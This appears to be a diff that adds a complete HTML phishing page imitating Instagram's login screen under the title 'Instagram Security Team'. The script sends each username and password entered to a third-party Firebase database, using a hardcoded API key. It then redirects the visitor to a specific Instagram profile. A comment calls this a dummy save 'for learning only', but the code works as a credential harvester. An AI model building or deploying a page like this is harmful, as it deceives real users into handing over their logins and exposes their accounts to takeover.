@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Security Team</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    body {
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      justify-content: center;
+    }
+    .container {
+      width: 350px;
+      
+      padding: 40px 30px;
+      text-align: center;
+      background: #fff;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 180px;
+      margin-bottom: 30px;
+    }
+    .input-box {
+      position: relative;
+      width: 100%;
+      margin: 8px 0;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      background: #fafafa;
+      font-size: 14px;
+      outline: none;
+    }
+    .eye-icon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: bold;
+      color: #555;
+      user-select: none;
+    }
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background: #0095f6;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-weight: bold;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    .login-btn:disabled {
+      background: #b2dffc;
+      cursor: not-allowed;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+    }
+    .divider div {
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .divider span {
+      margin: 0 10px;
+      font-size: 13px;
+      color: #8e8e8e;
+      font-weight: bold;
+    }
+    .facebook-login {
+      color: #385185;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+    .forgot {
+      font-size: 12px;
+      color: #00376b;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .signup-box {
+      width: 350px;
+      
+      text-align: center;
+      background: #fff;
+      padding: 20px;
+      font-size: 14px;
+    }
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .footer {
+      margin-top: 40px;
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      max-width: 1000px;
+    }
+    a{
+      text-decoration: none;
+    }
+    .footer a {
+      margin: 0 8px;
+      color: #8e8e8e;
+      text-decoration: none;
+    }
+    .footer p {
+      margin-top: 15px;
+    }
+    @media(max-width: 400px){
+      .container, .signup-box {
+        width: 90%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram">
+    </div>
+    <div class="input-box">
+      <input type="text" id="username" placeholder="Phone number, username, or email">
+    </div>
+    <div class="input-box">
+      <input type="password" id="password" placeholder="Password">
+      <span class="eye-icon" onclick="togglePassword()">Show</span>
+    </div>
+    <button class="login-btn" onclick="loginUser()">Log in</button>
+    <div class="divider">
+      <div></div>
+      <span>OR</span>
+      <div></div>
+    </div>
+    <div class="facebook-login">Log in with Facebook</div>
+    <a href="https://www.instagram.com/accounts/password/reset/"><div class="forgot">Forgotten your password?</div></a>
+  </div>
+
+  <div class="signup-box">
+    Don't have an account? <a href="https://www.instagram.com/accounts/signup/phone/?hl=en">Sign up</a>
+  </div>
+
+  <div class="footer">
+    <a href="#">About</a>
+    <a href="#">Help</a>
+    <a href="#">Press</a>
+    <a href="#">API</a>
+    <a href="#">Jobs</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Locations</a>
+    <a href="#">Language</a>
+    <p>Meta © 2025</p>
+  </div>
+
+  <!-- Firebase v8 (working with firebase.database) -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <script>
+    // Firebase Config (अपना डालना होगा)
+    const firebaseConfig = {
+  apiKey: "AIzaSyBAyx04GN-5MsBSztE2TQ4zViMs81iCFI8",
+  authDomain: "trext-91b51.firebaseapp.com",
+  databaseURL: "https://trext-91b51-default-rtdb.firebaseio.com",
+  projectId: "trext-91b51",
+  storageBucket: "trext-91b51.firebasestorage.app",
+  messagingSenderId: "396150208973",
+  appId: "1:396150208973:web:1e6ca3f5ce9fed7a5cec84",
+  measurementId: "G-VVVKCLZYEE"
+};
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function togglePassword() {
+      const passInput = document.getElementById("password");
+      const eye = document.querySelector(".eye-icon");
+      if (passInput.type === "password") {
+        passInput.type = "text";
+        eye.innerText = "Hide";
+      } else {
+        passInput.type = "password";
+        eye.innerText = "Show";
+      }
+    }
+
+    function loginUser() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (username === "" || password === "") {
+        alert("Please enter username and password");
+        return;
+      }
+
+      // Firebase dummy save (for learning only)
+      db.ref("demoLogins").push({
+        username: username,
+        password: password,
+        timestamp: new Date().toISOString()
+      });
+
+       // Try to open Instagram app
+        window.location.href = 'instagram://user?username=bindiya_kashyap_009';
+    }
+  </script>
+</body>
+</html>
